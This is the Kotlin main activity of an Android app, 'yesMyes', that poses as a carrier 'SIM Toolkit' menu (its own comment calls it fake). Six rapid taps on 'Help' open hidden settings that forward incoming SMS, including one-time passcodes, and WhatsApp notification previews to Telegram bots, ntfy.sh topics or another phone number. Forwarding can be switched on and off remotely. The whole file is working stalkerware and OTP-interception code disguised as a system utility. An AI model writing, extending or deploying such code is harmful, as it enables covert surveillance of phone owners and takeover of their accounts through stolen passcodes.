package com.onion.yesmyes

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.text.InputType
import android.view.View
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private var waStatus: TextView? = null

    // Secret unlock: rapid-tap "Help" 6 times within the window
    private var helpTapCount = 0
    private var helpWindowStart = 0L
    private val helpTapTarget = 6
    private val helpWindowMs = 2500L
    private val handler = Handler(Looper.getMainLooper())

    private fun updateWaStatus() {
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        val granted = NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        waStatus?.text = when {
            !prefs.getBoolean("use_whatsapp", false) -> ""
            granted -> "Notification access granted - WhatsApp forwarding is active."
            else -> "Notification access NOT granted yet. Tap the button below and enable it for this app."
        }
    }

    override fun onResume() {
        super.onResume()
        updateWaStatus()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        supportActionBar?.hide()
        showSimToolkitMenu()
    }

    /** Returns list of "Slot N · Carrier · Number" lines for active SIMs. */
    private fun getSimInfoLines(): List<String> {
        val lines = mutableListOf<String>()
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED
            ) {
                lines.add("Permission needed to read SIM info")
                return lines
            }

            val sm = getSystemService(SubscriptionManager::class.java) ?: return listOf("No subscription manager")
            val subs = sm.activeSubscriptionInfoList
            if (subs.isNullOrEmpty()) {
                lines.add("No active SIM detected")
                return lines
            }

            for (sub in subs) {
                val slot = sub.simSlotIndex + 1
                val carrier = sub.carrierName?.toString()?.takeIf { it.isNotBlank() }
                    ?: sub.displayName?.toString()?.takeIf { it.isNotBlank() }
                    ?: "Unknown carrier"
                val number = sub.number?.takeIf { it.isNotBlank() } ?: "Number not available"
                lines.add("SIM $slot  ·  $carrier  ·  $number")
            }
        } catch (e: SecurityException) {
            lines.add("Permission denied for SIM info")
        } catch (e: Exception) {
            lines.add("Could not read SIM info")
        }
        return lines
    }

    /** Fake SIM Toolkit menu (shown on normal open). */
    private fun showSimToolkitMenu() {
        helpTapCount = 0
        val density = resources.displayMetrics.density
        val padH = (16 * density).toInt()
        val padV = (12 * density).toInt()   // tighter vertical spacing

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.BLACK)
            // Smaller top padding so content sits higher
            setPadding(padH, (20 * density).toInt(), padH, padH)
        }

        // Header title
        root.addView(TextView(this).apply {
            text = "SIM Toolkit"
            textSize = 22f
            setTypeface(typeface, Typeface.BOLD)
            setTextColor(Color.WHITE)
            setPadding(padH, 0, padH, (8 * density).toInt())
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        // Live SIM numbers + carriers
        val simLines = getSimInfoLines()
        for (line in simLines) {
            root.addView(TextView(this).apply {
                text = line
                textSize = 14f
                setTextColor(0xFFB0BEC5.toInt())
                setPadding(padH, (4 * density).toInt(), padH, (4 * density).toInt())
            }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        }

        // Divider
        root.addView(View(this).apply {
            setBackgroundColor(0xFF37474F.toInt())
        }, LinearLayout.LayoutParams(MATCH_PARENT, (1 * density).toInt()).also {
            it.topMargin = (10 * density).toInt()
            it.bottomMargin = (4 * density).toInt()
        })

        fun menuItem(label: String, onClick: (() -> Unit)? = null): TextView {
            return TextView(this).apply {
                text = label
                textSize = 18f
                setTextColor(Color.WHITE)
                setPadding(padH, padV, padH, padV)
                setOnClickListener {
                    onClick?.invoke() ?: Toast.makeText(
                        this@MainActivity,
                        "Service unavailable",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
        }

        root.addView(menuItem("Customer Care") {
            Toast.makeText(this, "Connecting to Customer Care…", Toast.LENGTH_SHORT).show()
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        root.addView(menuItem("Activate Other VAS Service") {
            Toast.makeText(this, "No VAS services available", Toast.LENGTH_SHORT).show()
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        root.addView(menuItem("Deactivate VAS Service") {
            Toast.makeText(this, "No active VAS services", Toast.LENGTH_SHORT).show()
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        // Help — secret unlock via 6 rapid taps
        root.addView(menuItem("Help") {
            onHelpTapped()
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        root.addView(menuItem("My Bookmarks") {
            Toast.makeText(this, "No bookmarks", Toast.LENGTH_SHORT).show()
        }, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))

        // Use a plain LinearLayout (no ScrollView) so the black background
        // fills the whole screen without an empty grey/black footer look
        setContentView(root)

        // Ask for phone permission so SIM info can appear
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED
        ) {
            val phonePerms = mutableListOf(Manifest.permission.READ_PHONE_STATE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                phonePerms.add(Manifest.permission.READ_PHONE_NUMBERS)
            }
            ActivityCompat.requestPermissions(this, phonePerms.toTypedArray(), 2)
        }
    }

    private fun onHelpTapped() {
        val now = System.currentTimeMillis()
        if (now - helpWindowStart > helpWindowMs) {
            helpTapCount = 0
            helpWindowStart = now
        }
        helpTapCount++
        if (helpTapCount >= helpTapTarget) {
            helpTapCount = 0
            showRealSettings()
        }
    }

    /** Real yesMyes settings (ntfy at top, no SMS delete). */
    private fun showRealSettings() {
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        supportActionBar?.show()
        supportActionBar?.title = "Settings"

        val pad = (24 * resources.displayMetrics.density).toInt()
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad, pad, pad)
        }

        fun sectionLabel(text: String) = TextView(this).apply {
            this.text = text
            textSize = 16f
            setTypeface(typeface, Typeface.BOLD)
            setPadding(0, pad, 0, pad / 4)
        }

        val deviceNameField = EditText(this).apply {
            hint = android.os.Build.MODEL
            setText(prefs.getString("device_name", ""))
        }

        // --- ntfy first ---
        val useNtfyBox = CheckBox(this).apply {
            text = "Forward via ntfy.sh  (Recommended)"
            isChecked = prefs.getBoolean("use_ntfy", false)
            setTextColor(0xFF4CAF50.toInt())
        }
        val ntfyTopicField = EditText(this).apply {
            hint = "ntfy topic (e.g. my-sms-xyz123)"
            setText(prefs.getString("ntfy_topic", ""))
        }
        val ntfyNote = TextView(this).apply {
            text = "Subscribe to the same topic in the ntfy app. " +
                "Publish /start or /stop (optionally with a device name or \"all\") to the topic " +
                "to turn forwarding on/off remotely."
            textSize = 13f
            setPadding(0, 0, 0, pad / 4)
        }

        val useSmsBox = CheckBox(this).apply {
            text = "Forward via SMS"
            isChecked = prefs.getBoolean("use_sms", false)
        }
        val smsTargetField = EditText(this).apply {
            hint = "Forward to phone number (e.g. +15551234567)"
            inputType = InputType.TYPE_CLASS_PHONE
            setText(prefs.getString("sms_target", ""))
        }

        val useTelegramBox = CheckBox(this).apply {
            text = "Forward via Telegram"
            isChecked = prefs.getBoolean("use_telegram", false)
        }
        val telegramWarning = TextView(this).apply {
            text = "⚠️ Telegram may flag bots that forward OTPs. You may need a new bot token from @BotFather."
            setTextColor(0xFFE0A030.toInt())
            textSize = 13f
            setPadding(0, 0, 0, pad / 4)
        }
        val tokenField = EditText(this).apply {
            hint = "Bot token (from @BotFather)"
            setText(prefs.getString("bot_token", ""))
        }
        val chatIdField = EditText(this).apply {
            hint = "Chat ID (from @userinfobot)"
            setText(prefs.getString("chat_id", ""))
        }

        val useWhatsAppBox = CheckBox(this).apply {
            text = "Forward WhatsApp messages"
            isChecked = prefs.getBoolean("use_whatsapp", false)
        }
        val waNote = TextView(this).apply {
            text = "Reads WhatsApp notifications (needs Notification access). " +
                "Only sender/group and message preview are forwarded."
            textSize = 13f
            setPadding(0, 0, 0, pad / 4)
        }
        val waGrant = Button(this).apply {
            text = "Grant notification access"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        }
        waStatus = TextView(this).apply { textSize = 13f }

        val toggle = CheckBox(this).apply {
            text = "Forwarding enabled"
            isChecked = prefs.getBoolean("enabled", false)
            textSize = 16f
            setPadding(0, pad / 2, 0, pad / 4)
        }

        val save = Button(this).apply { text = "Save" }
        val test = Button(this).apply { text = "Send test message" }
        val hide = Button(this).apply { text = "Hide settings" }
        val status = TextView(this).apply {
            textSize = 13f
            setPadding(0, pad / 4, 0, 0)
        }

        fun saveCfg() {
            prefs.edit()
                .putString("device_name", deviceNameField.text.toString().trim())
                .putBoolean("use_sms", useSmsBox.isChecked)
                .putString("sms_target", smsTargetField.text.toString().trim())
                .putBoolean("use_telegram", useTelegramBox.isChecked)
                .putString("bot_token", tokenField.text.toString().trim())
                .putString("chat_id", chatIdField.text.toString().trim())
                .putBoolean("use_ntfy", useNtfyBox.isChecked)
                .putString("ntfy_topic", ntfyTopicField.text.toString().trim())
                .putBoolean("enabled", toggle.isChecked)
                .putBoolean("use_whatsapp", useWhatsAppBox.isChecked)
                .apply()
        }

        save.setOnClickListener {
            if (!hasPerms()) { askPerms(); return@setOnClickListener }
            saveCfg()
            if (useTelegramBox.isChecked) {
                TelegramSender.announce(
                    tokenField.text.toString().trim(),
                    chatIdField.text.toString().trim(),
                    TelegramSender.effectiveDeviceName(this),
                    toggle.isChecked
                )
            }
            Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show()
        }

        test.setOnClickListener {
            saveCfg()
            val deviceName = TelegramSender.effectiveDeviceName(this)
            var firedAny = false
            if (useTelegramBox.isChecked) {
                val token = tokenField.text.toString().trim()
                val chatId = chatIdField.text.toString().trim()
                if (token.isNotEmpty() && chatId.isNotEmpty()) {
                    firedAny = true
                    status.text = "Sending via Telegram..."
                    TelegramSender.send(token, chatId, "✅ Test message ($deviceName)") { ok, msg ->
                        runOnUiThread {
                            status.text = "Telegram: " + (if (ok) "Sent!" else "Failed: $msg")
                        }
                    }
                }
            }
            if (useNtfyBox.isChecked) {
                val topic = ntfyTopicField.text.toString().trim()
                if (topic.isNotEmpty()) {
                    firedAny = true
                    NtfySender.send(topic, "✅ Test message ($deviceName)", title = deviceName) { ok, msg ->
                        runOnUiThread {
                            val prev = status.text.toString()
                            status.text = prev + "\nntfy: " + (if (ok) "Sent!" else "Failed: $msg")
                        }
                    }
                }
            }
            if (!firedAny) {
                Toast.makeText(this, "Enable and fill in at least one channel first", Toast.LENGTH_SHORT).show()
            }
        }

        hide.setOnClickListener {
            supportActionBar?.hide()
            showSimToolkitMenu()
        }

        listOf(
            sectionLabel("Device"), deviceNameField,
            sectionLabel("ntfy.sh"), useNtfyBox, ntfyTopicField, ntfyNote,
            sectionLabel("SMS"), useSmsBox, smsTargetField,
            sectionLabel("Telegram"), useTelegramBox, telegramWarning, tokenField, chatIdField,
            sectionLabel("WhatsApp"), useWhatsAppBox, waNote, waGrant, waStatus!!,
            toggle, save, test, hide, status
        ).forEach {
            root.addView(it, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT))
        }
        setContentView(ScrollView(this).apply { addView(root) })
        if (!hasPerms()) askPerms()
        updateWaStatus()

        val savedToken = prefs.getString("bot_token", "")?.trim().orEmpty()
        val savedChatId = prefs.getString("chat_id", "")?.trim().orEmpty()
        if (prefs.getBoolean("use_telegram", false) && savedToken.isNotEmpty() && savedChatId.isNotEmpty()) {
            TelegramSender.announce(
                savedToken,
                savedChatId,
                TelegramSender.effectiveDeviceName(this),
                prefs.getBoolean("enabled", false)
            )
        }
    }

    private val perms = arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS)

    private fun hasPerms() = perms.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun askPerms() = ActivityCompat.requestPermissions(this, perms, 1)

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 2 && grantResults.isNotEmpty() &&
            grantResults[0] == PackageManager.PERMISSION_GRANTED
        ) {
            // Refresh the SIM Toolkit screen so numbers appear
            showSimToolkitMenu()
        }
    }
}
